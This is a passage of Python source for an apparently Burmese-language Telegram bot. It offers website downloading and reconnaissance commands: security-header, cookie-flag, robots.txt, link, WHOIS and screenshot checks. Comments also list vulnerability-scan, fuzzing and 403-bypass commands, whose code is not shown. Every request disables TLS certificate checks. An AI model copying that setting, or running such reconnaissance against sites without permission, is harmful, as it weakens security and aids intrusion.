        await query.answer("🚫 Admin only", show_alert=True); return
    if update.effective_chat.type != "private":
        await query.answer("Private chat only", show_alert=True); return

    async with db_lock:
        db = _load_db_sync()
    data = query.data

    if data == "adm_users":
        lines = ["👥 *Users*\n"]
        for uid, u in list(db["users"].items())[:20]:
            icon = "🚫" if u["banned"] else "✅"
            lines.append(f"{icon} `{uid}` — {u['name']} | {u['total_downloads']} DL")
        kb = [[InlineKeyboardButton("🔙 Back", callback_data="adm_back")]]
        try: await query.edit_message_text("\n".join(lines) or "Empty", reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')
        except BadRequest: pass

    elif data == "adm_stats":
        today   = str(date.today())
        tdl     = sum(u.get("total_downloads",0) for u in db["users"].values())
        tdl_day = sum(u["count_today"] for u in db["users"].values() if u.get("last_date")==today)
        top = sorted(db["users"].items(), key=lambda x: x[1].get("total_downloads",0), reverse=True)[:5]
        top_txt = "\n".join(f"  {i+1}. {u['name']} ({u['total_downloads']})" for i,(_,u) in enumerate(top)) or "None"
        kb = [[InlineKeyboardButton("🔙 Back", callback_data="adm_back")]]
        await query.edit_message_text(
            f"📊 *Stats*\n\nTotal: `{tdl}` | Today: `{tdl_day}`\n\n🏆 Top:\n{top_txt}",
            reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown'
        )

    elif data == "adm_settings":
        s  = db["settings"]
        kb = [
            [InlineKeyboardButton("📋 Commands List", callback_data="adm_cmds")],
            [InlineKeyboardButton("🔙 Back", callback_data="adm_back")]
        ]
        await query.edit_message_text(
            f"⚙️ *Settings*\n\n"
            f"📅 Daily Limit: `{s['global_daily_limit']}`\n"
            f"📄 Max Pages: `{s['max_pages']}`\n"
            f"🖼️ Max Assets: `{s['max_assets']}`\n"
            f"🤖 Bot: `{'🟢 ON' if s['bot_enabled'] else '🔴 OFF'}`\n"
            f"⏱️ Rate Limit: `{RATE_LIMIT_SEC}s`\n"
            f"💾 Max Asset: `{MAX_ASSET_MB}MB` | Split: `{SPLIT_MB}MB`\n\n"
            f"*Change settings with /adminset:*\n"
            f"`/adminset limit global 5`\n"
            f"`/adminset pages 100`\n"
            f"`/adminset assets 1000`",
            reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown'
        )

    elif data == "adm_cmds":
        kb = [[InlineKeyboardButton("🔙 Back", callback_data="adm_back")]]
        await query.edit_message_text(
            "📋 *Admin Commands*\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "👤 *User Management*\n"
            "  `/ban <id>` — User ကို ban လုပ်ရန်\n"
            "  `/unban <id>` — Ban ဖြုတ်ရန်\n"
            "  `/userinfo <id>` — User info ကြည့်ရန်\n"
            "  `/allusers` — User စာရင်းကြည့်ရန်\n\n"
            "⚙️ *Settings*\n"
            "  `/adminset limit global <n>` — Global limit\n"
            "  `/adminset limit <id> <n>` — Per-user limit\n"
            "  `/adminset pages <n>` — Max pages\n"
            "  `/adminset assets <n>` — Max assets\n\n"
            "📢 *Other*\n"
            "  `/broadcast <msg>` — All users ကို message ပို့ရန်\n"
            "  `/admin` — Panel ပြန်ဖွင့်ရန်",
            reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown'
        )

    elif data == "adm_toggle_bot":
        async with db_lock:
            db2 = _load_db_sync()
            db2["settings"]["bot_enabled"] = not db2["settings"]["bot_enabled"]
            _save_db_sync(db2)
            new_state = db2["settings"]["bot_enabled"]
        await query.answer(f"Bot is now {'🟢 ON' if new_state else '🔴 OFF'}", show_alert=True)
        async with db_lock:
            db3 = _load_db_sync()
        await _send_admin_panel(query, db3)

    elif data == "adm_log":
        all_logs = []
        for uid, u in db["users"].items():
            for d in u.get("downloads",[]): all_logs.append((u["name"], d))
        all_logs.sort(key=lambda x: x[1]["time"], reverse=True)
        lines = ["📜 *Recent 15*\n"]
        for name, d in all_logs[:15]:
            icon = "✅" if d["status"]=="success" else "❌"
            lines.append(f"{icon} *{name}* `{d['url'][:35]}` {d['time']}")
        kb = [[InlineKeyboardButton("🔙 Back", callback_data="adm_back")]]
        await query.edit_message_text(
            "\n".join(lines) if len(lines)>1 else "Empty",
            reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown'
        )

    elif data == "adm_back":
        await _send_admin_panel(query, db)

    elif data == "adm_scans":
        if _active_scans:
            lines = ["🔍 *Active Scans*\n"]
            for u_id, sname in _active_scans.items():
                uinfo = db["users"].get(str(u_id), {})
                uname = uinfo.get("name", str(u_id))
                lines.append(f"  • `{u_id}` ({uname}) — *{sname}*")
        else:
            lines = ["🔍 *Active Scans*\n", "  ✅ No scans running"]
        kb = [[InlineKeyboardButton("🔙 Back", callback_data="adm_back")]]
        try:
            await query.edit_message_text(
                "\n".join(lines), reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')
        except BadRequest: pass


# ══════════════════════════════════════════════════
# 🆕  NEW FEATURES — v19.0
# ══════════════════════════════════════════════════

# ── /headers ─────────────────────────────────────

async def cmd_headers(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/headers <url> — HTTP Security Headers စစ်ဆေးသည်"""
    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/headers https://example.com`\n\n"
            "🔍 HTTP response headers + security headers စစ်ဆေးပေးမည်\n"
            "✅ Present / ❌ Missing security headers ကို ပြပေးမည်",
            parse_mode='Markdown'
        )
        return

    url = context.args[0].strip()
    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return
    if uid in _active_scans:
        await update.effective_message.reply_text(
            f"⏳ *`{_active_scans[uid]}` running* — ပြီးဆုံးဖို့ စောင့်ပါ\n"
            "သို့မဟုတ် `/stop` နှိပ်ပါ", parse_mode='Markdown')
        return
    _active_scans[uid] = "Headers"
    if not url.startswith('http'):
        url = 'https://' + url

    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        _active_scans.pop(uid, None)   # fix
        return

    msg = await update.effective_message.reply_text(f"🔍 Headers စစ်နေသည်...", parse_mode='Markdown')

    def _do():
        try:
            r = requests.get(url, headers=_get_headers(), timeout=15, verify=False,
                             allow_redirects=True)
            return r.status_code, dict(r.headers), r.elapsed.total_seconds()
        except Exception as e:
            return 0, {}, 0

    status, hdrs, elapsed = await asyncio.to_thread(_do)

    if not status:
        await msg.edit_text("❌ Request မအောင်မြင်ဘူး — URL စစ်ပါ")
        _active_scans.pop(uid, None)   # fix
        return

    # Security headers check
    SEC_HEADERS = {
        "Strict-Transport-Security":   ("🔒 HSTS",        True),
        "Content-Security-Policy":     ("🛡️ CSP",          True),
        "X-Frame-Options":             ("🖼️ Clickjacking", True),
        "X-Content-Type-Options":      ("📄 MIME sniff",   True),
        "Referrer-Policy":             ("🔗 Referrer",     True),
        "Permissions-Policy":          ("🎛️ Permissions",  True),
        "X-XSS-Protection":            ("🦠 XSS Protect",  False),  # deprecated
        "Access-Control-Allow-Origin": ("🌐 CORS",         False),
    }

    hdrs_lower = {k.lower(): v for k, v in hdrs.items()}

    lines = [f"📋 *HTTP Headers — `{urlparse(url).hostname}`*",
             f"Status: `{status}` | Time: `{elapsed:.2f}s`\n"]

    lines.append("*🔒 Security Headers:*")
    for hdr, (label, recommended) in SEC_HEADERS.items():
        val = hdrs_lower.get(hdr.lower(), "")
        if val:
            short = val[:50] + ("…" if len(val) > 50 else "")
            lines.append(f"  ✅ {label}: `{short}`")
        else:
            icon = "❌" if recommended else "⚠️"
            lines.append(f"  {icon} {label}: *missing*")

    lines.append("\n*📡 Notable Headers:*")
    notable_keys = ['server', 'x-powered-by', 'content-type', 'cache-control',
                    'cf-ray', 'x-cache', 'via', 'set-cookie', 'location', 'etag']
    for k in notable_keys:
        v = hdrs_lower.get(k, "")
        if v:
            short = v[:60] + ("…" if len(v) > 60 else "")
            lines.append(f"  `{k}: {short}`")

    _active_scans.pop(uid, None)
    await msg.edit_text("\n".join(lines), parse_mode='Markdown')


# ── /links ────────────────────────────────────────

async def cmd_links(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/links <url> — Page ထဲက link အားလုံး ထုတ်ပေးသည်"""
    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/links https://example.com`\n\n"
            "🔗 Page ထဲက internal + external links အားလုံး list ပြပေးမည်",
            parse_mode='Markdown'
        )
        return

    url = context.args[0].strip()
    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return
    if uid in _active_scans:
        await update.effective_message.reply_text(
            f"⏳ *`{_active_scans[uid]}` running* — ပြီးဆုံးဖို့ စောင့်ပါ\n"
            "သို့မဟုတ် `/stop` နှိပ်ပါ", parse_mode='Markdown')
        return
    _active_scans[uid] = "Links"
    if not url.startswith('http'):
        url = 'https://' + url

    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        _active_scans.pop(uid, None)   # fix
        return

    msg = await update.effective_message.reply_text("🔗 Links ကောက်နေသည်...", parse_mode='Markdown')

    def _do():
        try:
            r = requests.get(url, headers=_get_headers(), timeout=15, verify=False)
            soup = BeautifulSoup(r.text, _BS_PARSER)
            base_netloc = urlparse(url).netloc
            internal, external = [], []
            seen = set()
            for tag in soup.find_all('a', href=True):
                href = tag['href'].strip()
                if not href or href.startswith(('#', 'mailto:', 'tel:', 'javascript:')):
                    continue
                full = urljoin(url, href)
                if full in seen: continue
                seen.add(full)
                text = tag.get_text(strip=True)[:30] or "(no text)"
                if urlparse(full).netloc == base_netloc:
                    internal.append((full, text))
                else:
                    external.append((full, text))
            return internal, external
        except Exception as e:
            return [], []

    internal, external = await asyncio.to_thread(_do)

    if not internal and not external:
        await msg.edit_text("❌ Links မတွေ့ပါ — URL စစ်ပါ")
        _active_scans.pop(uid, None)   # fix
        return

    # Build text report + send as file if large
    lines = [f"🔗 *Links — `{urlparse(url).hostname}`*\n"]
    lines.append(f"*Internal ({len(internal)}):*")
    for lnk, txt in internal[:30]:
        lines.append(f"  • [{txt}]({lnk})")
    if len(internal) > 30:
        lines.append(f"  _...and {len(internal)-30} more_")

    lines.append(f"\n*External ({len(external)}):*")
    for lnk, txt in external[:20]:
        lines.append(f"  • [{txt}]({lnk})")
    if len(external) > 20:
        lines.append(f"  _...and {len(external)-20} more_")

    out = "\n".join(lines)
    if len(out) > 3800:
        out = out[:3800] + "\n\n_…truncated (too many links)_"

    _active_scans.pop(uid, None)
    await msg.edit_text(out, parse_mode='Markdown', disable_web_page_preview=True)


# ── /robots ───────────────────────────────────────

async def cmd_robots(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/robots <url> — robots.txt ဖတ်ပြီး ကောင်းကောင်း parse လုပ်ပေးသည်"""
    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/robots https://example.com`\n\n"
            "🤖 robots.txt ဖတ်ပြီး Disallow, Allow, Sitemap, Crawl-delay ပြပေးမည်",
            parse_mode='Markdown'
        )
        return

    url = context.args[0].strip()
    if not url.startswith('http'):
        url = 'https://' + url

    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return

    parsed = urlparse(url)
    robots_url = f"{parsed.scheme}://{parsed.netloc}/robots.txt"

    msg = await update.effective_message.reply_text("🤖 robots.txt ကောက်နေသည်...", parse_mode='Markdown')

    def _do():
        try:
            r = requests.get(robots_url, headers=_get_headers(), timeout=10, verify=False)
            return r.status_code, r.text
        except Exception as e:
            return 0, str(e)

    status, text = await asyncio.to_thread(_do)

    if status == 0:
        await msg.edit_text(f"❌ Error: `{text}`", parse_mode='Markdown')
        return
    if status == 404:
        await msg.edit_text("📭 robots.txt မရှိပါ (404)")
        return

    # Parse robots.txt
    lines_out = [f"🤖 *robots.txt — `{parsed.netloc}`*\n"]
    disallows, allows, sitemaps, delays = [], [], [], []
    current_agent = "*"

    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith('#'): continue
        if ':' in line:
            key, _, val = line.partition(':')
            key, val = key.strip().lower(), val.strip()
            if key == 'user-agent': current_agent = val
            elif key == 'disallow' and val: disallows.append((current_agent, val))
            elif key == 'allow' and val:    allows.append((current_agent, val))
            elif key == 'sitemap':          sitemaps.append(val)
            elif key == 'crawl-delay':      delays.append((current_agent, val))

    if disallows:
        lines_out.append(f"*🚫 Disallow ({len(disallows)}):*")
        for agent, path in disallows[:20]:
            lines_out.append(f"  `{path}` _{agent}_")
        if len(disallows) > 20:
            lines_out.append(f"  _...+{len(disallows)-20} more_")

    if allows:
        lines_out.append(f"\n*✅ Allow ({len(allows)}):*")
        for agent, path in allows[:10]:
            lines_out.append(f"  `{path}`")

    if sitemaps:
        lines_out.append(f"\n*🗺️ Sitemaps:*")
        for s in sitemaps[:5]:
            lines_out.append(f"  `{s[:80]}`")

    if delays:
        lines_out.append(f"\n*⏱️ Crawl-delay:*")
        for agent, d in delays[:5]:
            lines_out.append(f"  `{d}s` for `{agent}`")

    await msg.edit_text("\n".join(lines_out), parse_mode='Markdown', disable_web_page_preview=True)


# ── /whois ────────────────────────────────────────

async def cmd_whois(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/whois <domain> — WHOIS & DNS info ကြည့်သည်"""
    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/whois example.com`\n\n"
            "🌐 Domain IP, DNS records ကြည့်ပေးမည်\n"
            "_(Full WHOIS: python-whois မလိုဘဲ DNS-based info ပြပေးမည်)_",
            parse_mode='Markdown'
        )
        return

    domain = context.args[0].strip().lstrip('https://').lstrip('http://').split('/')[0]
    msg = await update.effective_message.reply_text(f"🌐 WHOIS `{domain}` ကြည့်နေသည်...", parse_mode='Markdown')

    def _do():
        results = {}
        # DNS resolve
        try:
            ip = socket.gethostbyname(domain)
            results['ip'] = ip
        except Exception as e:
            results['ip'] = f"ERROR: {e}"

        # Try whois via rdap.org (HTTP-based, no lib needed)
        try:
            r = requests.get(
                f"https://rdap.org/domain/{domain}",
                timeout=8, headers={'Accept': 'application/json'}
            )
            if r.status_code == 200:
                data = r.json()
                results['rdap'] = {
                    'name': data.get('ldhName', domain),
                    'status': data.get('status', []),
                    'registered': next(
                        (e['eventDate'] for e in data.get('events', []) if e.get('eventAction') == 'registration'),
                        'N/A'
                    ),
                    'expires': next(
                        (e['eventDate'] for e in data.get('events', []) if e.get('eventAction') == 'expiration'),
                        'N/A'
                    ),
                    'nameservers': [ns.get('ldhName', '') for ns in data.get('nameservers', [])][:4],
                }
        except Exception:
            results['rdap'] = None

        # Get all IPs (A records simulation)
        try:
            all_ips = list({r[4][0] for r in socket.getaddrinfo(domain, None)})[:6]
            results['all_ips'] = all_ips
        except Exception:
            results['all_ips'] = []

        return results

    data = await asyncio.to_thread(_do)

    lines = [f"🌐 *WHOIS — `{domain}`*\n"]
    lines.append(f"📍 IP: `{data.get('ip', 'N/A')}`")

    if data.get('all_ips') and len(data['all_ips']) > 1:
        lines.append(f"📍 All IPs: `{', '.join(data['all_ips'])}`")

    rdap = data.get('rdap')
    if rdap:
        lines.append(f"\n*📋 Registration Info:*")
        lines.append(f"  Domain: `{rdap.get('name', domain)}`")
        lines.append(f"  Status: `{', '.join(rdap.get('status', []))}`")
        lines.append(f"  Registered: `{rdap.get('registered', 'N/A')[:19]}`")
        lines.append(f"  Expires: `{rdap.get('expires', 'N/A')[:19]}`")
        if rdap.get('nameservers'):
            lines.append(f"  NS: `{', '.join(rdap['nameservers'])}`")
    else:
        lines.append("\n⚠️ RDAP data ရရှိနိုင်ခြင်း မရှိပါ")

    await msg.edit_text("\n".join(lines), parse_mode='Markdown')


# ── /cookies ─────────────────────────────────────

async def cmd_cookies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/cookies <url> — Cookie security flags စစ်ဆေးသည်"""
    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/cookies https://example.com`\n\n"
            "🍪 Set-Cookie headers ကို parse ပြီး security flags စစ်ဆေးပေးမည်\n"
            "HttpOnly, Secure, SameSite, Expires ပြပေးမည်",
            parse_mode='Markdown'
        )
        return

    url = context.args[0].strip()
    if not url.startswith('http'):
        url = 'https://' + url

    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return

    msg = await update.effective_message.reply_text("🍪 Cookies စစ်နေသည်...", parse_mode='Markdown')

    def _do():
        try:
            r = requests.get(url, headers=_get_headers(), timeout=12, verify=False, allow_redirects=True)
            cookies_raw = r.headers.get_all('Set-Cookie') if hasattr(r.headers, 'get_all') else []
            if not cookies_raw:
                # requests combines Set-Cookie; use raw response
                cookies_raw = [v for k, v in r.raw.headers.items() if k.lower() == 'set-cookie']
            # fallback: parse from cookies jar
            parsed_cookies = []
            for ck in r.cookies:
                parsed_cookies.append({
                    'name': ck.name,
                    'value': ck.value[:20] + "…" if len(ck.value or "") > 20 else (ck.value or ""),
                    'domain': ck.domain or urlparse(url).hostname,
                    'secure': bool(ck.secure),
                    'httponly': bool(ck._rest.get('HttpOnly', False)),
                    'samesite': ck._rest.get('SameSite', 'Not set'),
                    'expires': str(ck.expires) if ck.expires else 'Session',
                })
            return r.status_code, parsed_cookies
        except Exception as e:
            return 0, []

    status, cookies = await asyncio.to_thread(_do)

    if not cookies:
        await msg.edit_text(
            f"📭 *Cookies မတွေ့ပါ*\n"
            f"Status: `{status}`\n\n"
            "Site က Set-Cookie header မပို့ဘူး (သို့မဟုတ် session-less ဖြစ်သည်)",
            parse_mode='Markdown'
        )
        return

    lines = [f"🍪 *Cookies — `{urlparse(url).hostname}`* ({len(cookies)} found)\n"]

    for ck in cookies[:15]:
        secure_icon  = "✅" if ck['secure']   else "⚠️"
        httponly_icon = "✅" if ck['httponly'] else "⚠️"
        ss = ck.get('samesite', 'Not set')
        ss_icon = "✅" if ss in ('Strict', 'Lax') else "⚠️"

        lines.append(f"🔸 `{ck['name']}`")
        lines.append(f"   {secure_icon} Secure | {httponly_icon} HttpOnly | {ss_icon} SameSite={ss}")
        lines.append(f"   Domain: `{ck['domain']}` | Expires: `{ck['expires']}`")

    await msg.edit_text("\n".join(lines), parse_mode='Markdown')


# ── /screenshot ───────────────────────────────────

async def cmd_screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/screenshot <url> — Puppeteer screenshot → Telegram image"""
    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/screenshot https://example.com`\n\n"
            "📸 Puppeteer ဖြင့် screenshot ရိုက်ပြီး image ပြပေးမည်\n"
            "⚙️ Requires: `node js_render.js` + puppeteer",
            parse_mode='Markdown'
        )
        return

    if not PUPPETEER_OK:
        await update.effective_message.reply_text(
            "❌ *Puppeteer မရှိသေးပါ*\n\n"
            "Setup:\n```\nnpm install puppeteer\n```",
            parse_mode='Markdown'
        )
        return

    url = context.args[0].strip()
    if not url.startswith('http'):
        url = 'https://' + url

    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return

    msg = await update.effective_message.reply_text(
        f"📸 Screenshot ရိုက်နေသည்...\n`{urlparse(url).hostname}`",
        parse_mode='Markdown'
    )

    # Screenshot script path
    ss_script = os.path.join(os.path.dirname(os.path.abspath(__file__)), "js_screenshot.js")

    def _do():
        # If dedicated screenshot script exists — use it
        if os.path.exists(ss_script):
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            out_path = os.path.join(tempfile.gettempdir(), f"ss_{ts}.png")
            try:
                res = subprocess.run(
                    ["node", ss_script, url, out_path],
                    capture_output=True, timeout=45, text=True, shell=False
                )
                if res.returncode == 0 and os.path.exists(out_path):
                    with open(out_path, 'rb') as f:
                        data = f.read()
                    os.remove(out_path)
                    return data, None
                return None, res.stderr[:200] or "Screenshot script failed"
            except subprocess.TimeoutExpired:
                return None, "Timeout (45s)"
            except Exception as e:
                return None, str(e)

        # Fallback: js_render.js + no-screenshot message
        html = fetch_with_puppeteer(url)
        if html:
            return None, "js_screenshot.js မရှိဘဲ screenshot မရနိုင်ပါ\njs_render.js တစ်ခုတည်း ရှိသည်"
        return None, "Puppeteer error"

    img_data, err = await asyncio.to_thread(_do)

    if err and not img_data:
        await msg.edit_text(f"❌ {err}", parse_mode='Markdown')
        return

    if img_data:
        await msg.delete()
        buf = io.BytesIO(img_data)
        buf.name = "screenshot.png"
        await context.bot.send_photo(
            chat_id=update.effective_chat.id,
            photo=buf,
            caption=f"📸 `{urlparse(url).hostname}`\n{datetime.now().strftime('%Y-%m-%d %H:%M')}",
            parse_mode='Markdown'
        )
    else:
        await msg.edit_text(
            f"⚠️ Screenshot script (js_screenshot.js) မရှိပါ\n\n"
            "ဒီ file create လုပ်ပါ:\n"
            "```js\n"
            "const puppeteer = require('puppeteer');\n"
            "const [,, url, out] = process.argv;\n"
            "(async () => {\n"
            "  const b = await puppeteer.launch({args:['--no-sandbox']});\n"
            "  const p = await b.newPage();\n"
            "  await p.setViewport({width:1280,height:800});\n"
            "  await p.goto(url, {waitUntil:'networkidle2',timeout:30000});\n"
            "  await p.screenshot({path:out,fullPage:false});\n"
            "  await b.close();\n"
            "})();\n"
            "```",
            parse_mode='Markdown'
        )


# ── /clean ────────────────────────────────────────

async def cmd_clean(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/clean — Download folder ကို manually cleanup လုပ်သည်"""
    if not await verify_admin(update):
        await update.effective_message.reply_text("🚫 Admin only command")
        return

    msg = await update.effective_message.reply_text("🗑️ Cleaning up files...", parse_mode='Markdown')

    def _do():
        deleted, freed = 0, 0.0
        errors = []
        for folder in [DOWNLOAD_DIR, RESUME_DIR, APP_ANALYZE_DIR]:
            for root, dirs, files in os.walk(folder):
                for fname in files:
                    fpath = os.path.join(root, fname)
                    try:
                        size = os.path.getsize(fpath) / 1024 / 1024
                        os.remove(fpath)
                        deleted += 1
                        freed += size
                    except Exception as e:
                        errors.append(str(e)[:40])
            # Remove empty subdirs
            for root, dirs, files in os.walk(folder, topdown=False):
                for d in dirs:
                    dp = os.path.join(root, d)
                    try:
                        if not os.listdir(dp):
                            os.rmdir(dp)
                    except Exception:
                        pass
        return deleted, freed, errors

    deleted, freed, errors = await asyncio.to_thread(_do)

    lines = [
        "🗑️ *Manual Cleanup ပြီးပါပြီ*\n",
        f"📦 Deleted files: `{deleted}`",
        f"💾 Freed: `{freed:.2f}` MB",
    ]
    if errors:
        lines.append(f"\n⚠️ Errors: `{len(errors)}`")
        for e in errors[:3]:
            lines.append(f"  `{e}`")

    await msg.edit_text("\n".join(lines), parse_mode='Markdown')


# ── /logs ─────────────────────────────────────────

async def cmd_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/logs [n] — Recent bot.log entries ကြည့်သည်"""
    if not await verify_admin(update):
        await update.effective_message.reply_text("🚫 Admin only command")
        return

    n = 30
    if context.args and context.args[0].isdigit():
        n = min(int(context.args[0]), 100)

    log_path = os.path.join(DATA_DIR, "bot.log")
    if not os.path.exists(log_path):
        await update.effective_message.reply_text("📭 bot.log မရှိသေးပါ")
        return

    def _do():
        try:
            with open(log_path, 'r', encoding='utf-8', errors='replace') as f:
                lines = f.readlines()
            return lines[-n:]
        except Exception as e:
            return [str(e)]

    lines = await asyncio.to_thread(_do)

    text = "".join(lines).strip()
    if len(text) > 3800:
        text = text[-3800:]   # last part

    # Send as file if long, else inline
    if len(text) > 1500:
        buf = io.BytesIO(text.encode('utf-8'))
        buf.name = "bot.log"
        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=buf,
            filename=f"bot_log_{datetime.now().strftime('%Y%m%d_%H%M')}.txt",
            caption=f"📋 Last `{n}` log entries"
        )
    else:
        await update.effective_message.reply_text(
            f"📋 *Last {n} log entries:*\n```\n{text}\n```",
            parse_mode='Markdown'
        )


# ── /disk ─────────────────────────────────────────

async def cmd_disk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/disk — Downloaded files size + disk space ကြည့်သည်"""
    if not await verify_admin(update):
        await update.effective_message.reply_text("🚫 Admin only command")
        return

    def _do():
        info = {}
        # Per-folder sizes
        for name, folder in [
            ("Downloads", DOWNLOAD_DIR),
            ("Resume", RESUME_DIR),
            ("App Analysis", APP_ANALYZE_DIR),
        ]:
            total_size, file_count = 0, 0
            if os.path.exists(folder):
                for root, _, files in os.walk(folder):
                    for fname in files:
                        try:
                            total_size += os.path.getsize(os.path.join(root, fname))
                            file_count += 1
                        except Exception:
                            pass
            info[name] = {"size_mb": total_size / 1024 / 1024, "count": file_count}

        # Disk usage (data dir)
        try:
            st = shutil.disk_usage(DATA_DIR)
            info["disk"] = {
                "total_gb": st.total / 1024**3,
                "used_gb":  st.used  / 1024**3,
                "free_gb":  st.free  / 1024**3,
                "pct": (st.used / st.total) * 100,
            }
        except Exception:
            info["disk"] = None

        # Log file size
        log_p = os.path.join(DATA_DIR, "bot.log")
        info["log_mb"] = os.path.getsize(log_p) / 1024 / 1024 if os.path.exists(log_p) else 0

        return info

    info = await asyncio.to_thread(_do)

    lines = ["💾 *Storage Status*\n"]
    for name in ["Downloads", "Resume", "App Analysis"]:
        d = info[name]
        lines.append(f"📂 {name}: `{d['size_mb']:.2f}` MB (`{d['count']}` files)")

    lines.append(f"📋 bot.log: `{info['log_mb']:.2f}` MB")

    disk = info.get("disk")
    if disk:
        bar_fill = int(disk['pct'] / 10)
        bar = "█" * bar_fill + "░" * (10 - bar_fill)
        lines.append(f"\n💽 *Disk Usage:*")
        lines.append(f"`{bar}` {disk['pct']:.1f}%")
        lines.append(f"  Total: `{disk['total_gb']:.1f}` GB")
        lines.append(f"  Used:  `{disk['used_gb']:.1f}` GB")
        lines.append(f"  Free:  `{disk['free_gb']:.1f}` GB")

    await update.effective_message.reply_text("\n".join(lines), parse_mode='Markdown')


# ══════════════════════════════════════════════════
# 🔀  MERGED COMMANDS — v19.1
#   /dl      ← /download + /fullsite + /jsdownload + /jsfullsite
#   /scan    ← /vuln + /fuzz + /smartfuzz + /bypass403
#   /recon   ← /tech + /headers + /whois + /cookies + /robots + /links
#   /discover← /api + /extract + /subdomains
#   /sys     ← /clean + /disk + /logs  (admin)
#   /adminset← /setlimit + /setpages + /setassets  (admin)
# ══════════════════════════════════════════════════

# ────────────────────────────────────────────────
# /dl  —  Download (mode = inline keyboard)
# ────────────────────────────────────────────────

async def cmd_dl(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/dl <url> — Download (mode ကို keyboard နဲ့ ရွေး)
    Replaces: /download /fullsite /jsdownload /jsfullsite
    """
    if not await check_force_join(update, context):
        return

    args = context.args or []
    url  = args[0].strip() if args else ""

    # URL မပေးရင် usage ပြ
    if not url:
        await update.effective_message.reply_text(
            "📥 *Download Command*\n\n"
            "```\n/dl <url> [mode] [options]\n```\n\n"
            "*Modes:*\n"
            "  📄 `single` — Single page (default)\n"
            "  🌐 `full`   — Full site crawl\n"
            "  ⚡ `js`     — Single page + JS render\n"
            "  🚀 `jsful`  — Full site + JS render\n\n"
            "*Options (V30):*\n"
            "  `--depth N`  — Crawl depth (default: 5, max: 10)\n"
            "  `--cookie X` — Session cookie (e.g. `session=abc123`)\n"
            "  `--header X` — Custom header (`Key: Value`)\n\n"
            "*Examples:*\n"
            "  `/dl https://example.com full`\n"
            "  `/dl https://example.com full --depth 3`\n"
            "  `/dl https://app.com --cookie session=xyz123`",
            parse_mode='Markdown'
        )
        return

    if not url.startswith('http'):
        url = 'https://' + url

    # ── V30: Parse flags --cookie, --depth, --header ─────────
    import shlex as _shlex
    _cookies_dl = ""
    _headers_dl = ""
    _depth_dl   = 5
    _clean_args = []
    _i = 0
    while _i < len(args):
        a = args[_i]
        if a == '--cookie' and _i + 1 < len(args):
            _cookies_dl = args[_i + 1]; _i += 2
        elif a == '--header' and _i + 1 < len(args):
            _headers_dl = args[_i + 1]; _i += 2
        elif a == '--depth' and _i + 1 < len(args):
            try: _depth_dl = max(1, min(10, int(args[_i+1])))
            except: pass
            _i += 2
        else:
            _clean_args.append(a); _i += 1
    args = _clean_args

    # Mode ကို arg[1] မှ ဖတ် (optional)
    mode = args[1].lower() if len(args) > 1 else ""

    if mode in ("full", "fullsite"):
        # Full site download directly
        await enqueue_download(update, context, url, full_site=True, use_js=False, cookies=_cookies_dl, extra_headers=_headers_dl, max_depth=_depth_dl)
        return
    elif mode in ("js", "jspage"):
        await enqueue_download(update, context, url, full_site=False, use_js=True, cookies=_cookies_dl, extra_headers=_headers_dl, max_depth=_depth_dl)
        return
    elif mode in ("jsful", "jsfull", "jsfullsite"):
        await enqueue_download(update, context, url, full_site=True, use_js=True, cookies=_cookies_dl, extra_headers=_headers_dl, max_depth=_depth_dl)
        return
    elif mode in ("single", "page", ""):
        # Default single page — still show keyboard for confirmation
        pass

    # ── Inline keyboard mode selector ────────────
    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return

    domain = urlparse(url).hostname
    # Store url in context for callback
    context.user_data['dl_url'] = url

    kb = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("📄 Single Page",     callback_data=f"dl_single"),
            InlineKeyboardButton("🌐 Full Site",        callback_data=f"dl_full"),
        ],
        [
            InlineKeyboardButton("⚡ JS Single",        callback_data=f"dl_js"),
            InlineKeyboardButton("🚀 JS Full Site",     callback_data=f"dl_jsful"),
        ],
        [InlineKeyboardButton("❌ Cancel",             callback_data=f"dl_cancel")],
    ])
